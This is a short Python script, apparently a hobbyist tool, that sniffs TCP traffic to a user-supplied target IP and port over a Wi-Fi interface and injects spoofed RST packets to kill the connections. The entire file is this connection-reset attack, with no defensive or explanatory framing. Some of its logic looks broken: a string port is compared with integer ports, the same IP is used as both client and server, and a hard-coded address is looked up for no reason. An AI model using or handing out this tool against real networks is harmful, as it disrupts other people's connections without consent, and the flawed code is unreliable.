import pywifi
import threading
import random
import getmac
from scapy.layers.inet import TCP
from scapy.layers.inet import IP
try:
    import scapy.all
except ImportError:
    del scapy
    from scapy import all as scapy
DEFAULT_WINDOW_SIZE = 2052


scapy.all.conf.L3socket = scapy.all.L3RawSocket


def log(msg, params={}):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")


def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
    def f(p):
        return (
                is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p) or
                is_packet_tcp_client_to_server(server_ip, server_port, client_ip)(p)
        )

    return f


def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst

        return src_ip == server_ip and src_port == server_port and dst_ip == client_ip

    return f


def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport

        return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port

    return f


def send_reset(iface, seq_jitter=0, ignore_syn=True):

    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log(
            "Grabbed packet",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack,
            }
        )

        if "S" in flags and ignore_syn:
            print("Packet has SYN flag, not sending RST")
            return

        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        if jitter == 0:
            print("jitter == 0, this RST packet should close the connection")

        rst_seq = ack + jitter
        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE,
                                             seq=rst_seq)

        log(
            "Sending RST packet...",
            {
                "orig_ack": ack,
                "jitter": jitter,
                "seq": rst_seq,
            },
        )

        scapy.all.send(p, verbose=0, iface=iface)

    return f


def log_packet(p):
    return p.show()


if __name__ == "__main__":
    localhost_ip = input(f'Target IP:')
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    print(iface.name())
    localhost_server_port = input('Target port:')
    count = int(input('count of sniffing or reset:'))
    print(getmac.get_mac_address(ip='192.168.1.23'))
    log("Starting sniff...")
    t = scapy.all.sniff(
        iface=iface.name(),
        count=count,
        prn=send_reset(iface.name()),
        lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip))
    log("Finished sniffing!")
